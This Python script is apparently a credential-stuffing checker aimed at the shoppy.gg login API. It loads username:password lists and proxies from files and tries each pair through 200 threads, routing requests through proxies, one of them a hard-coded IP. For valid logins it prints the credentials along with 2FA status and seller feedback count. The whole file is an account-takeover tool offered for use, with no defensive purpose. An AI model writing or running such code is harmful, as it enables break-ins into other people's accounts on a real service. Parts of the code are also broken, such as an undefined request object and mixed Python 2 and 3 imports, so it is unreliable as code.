import concurrent.futures as Thread
import math
import numpy as np
from time import time
import logging
from time import sleep
import json
import random
from urllib3 import ProxyManager
import urllib3
from os import system

array = []
accs =[]
proxies = []
with open('accounts.txt','r') as f:
   for row in f:
       row = row.strip()
       if(row):
           accs.append(row)
with open('proxies.txt','r') as p:
   for row in p:
       row = row.strip()
       if(row):
           proxies.append(row)

checks = 0
def check(x):
       global checks
       try:
        system('title {}'.format(checks))
        payload = json.dumps({
        'username': x.split(':')[0],
        'password': x.split(':')[1],
        })
        # proxy_index = random.randint(0, len(ip_addresses) - 1)
        ttp = ProxyManager("HTTP_PROXY")
        conn = http.request('POST','https://shoppy.gg/api/v1/auth/login',body=payload,timeout=20.0,headers={'Content-Type': 'application/json'})
        # url = urljoin('',ourl)
        try:
            checks+=1
            data = json.loads(conn.data)
            if data["twofa_enabled"]:
             fa2 = True
            else:
             fa2 = False
            d= http.request('GET','https://shoppy.gg/api/v1/public/seller/{}'.format(x.split(':')[0]))
            data = json.loads(d.data)
            feedbacks = data["user"]["feedbacks"]
            print("2FA: {} - {}:{} Liczba Feedbackow:".format(fa2,x.split(':')[0],x.split(':')[1]),len(feedbacks))
        # time.sleep(1)
        # conn = requests.Session().get(url,timeout=40,proxies=proxy)
        except:
            q.put(x)
            return
            
       except:
         check(x)
def split_list(a_list):
    half = len(a_list)//2
    return a_list[:half], a_list[half:]

# from multiprocessing import Process
# if __name__ == '__main__':
#     A,B = split_list(accs)
#     p = Process(target=thread_starter, args=(A,))
#     p1= Process(target=thread_starter, args=(B,))
#     p.start()
#     p1.start()
#     p.join()
#     p1.join()



import threading
import time 
from Queue import Queue

print_lock = threading.Lock()

class MyThread(threading.Thread):
    def __init__(self, queue, args=(), kwargs=None):
        threading.Thread.__init__(self, args=(), kwargs=None)
        self.queue = queue
        self.daemon = True
        self.receive_messages = args[0]

    def run(self):
     while True:
        val = self.queue.get()
        if val is None:   # If you send `None`, the thread will exit.
            return
        self.do_thing_with_message(val)
    def do_thing_with_message(self, x):
                       global checks
                       try:
                        system('title {}'.format(checks))
                        payload = json.dumps({
                        'username': x.split(':')[0],
                        'password': x.split(':')[1],
                        })
                        http = ProxyManager("http://185.30.232.46:19999/")
                        conn = http.request('POST','https://shoppy.gg/api/v1/auth/login',body=payload,timeout=20.0,headers={'Content-Type': 'application/json'})
                        try:
                         data = json.loads(conn.data)
                         if data["twofa_enabled"]:
                          fa2 = True
                         else:
                          fa2 = False
                         d= http.request('GET','https://shoppy.gg/api/v1/public/seller/{}'.format(x.split(':')[0]))
                         data = json.loads(d.data)
                         feedbacks = data["user"]["feedbacks"]
                         print("2FA: {} - {}:{} Liczba Feedbackow:".format(fa2,x.split(':')[0],x.split(':')[1]),len(feedbacks))

                        except:
                         return
            
                       except:
                        self.do_thing_with_message(x)

if __name__ == '__main__':
    threads = []
    q = Queue()
    for t in range(200):
        threads.append(MyThread(q, args=(t % 2 == 0,)))
        threads[t].start()
    with Thread.ThreadPoolExecutor(max_workers=200) as executor:
     executor.map(check,accs)



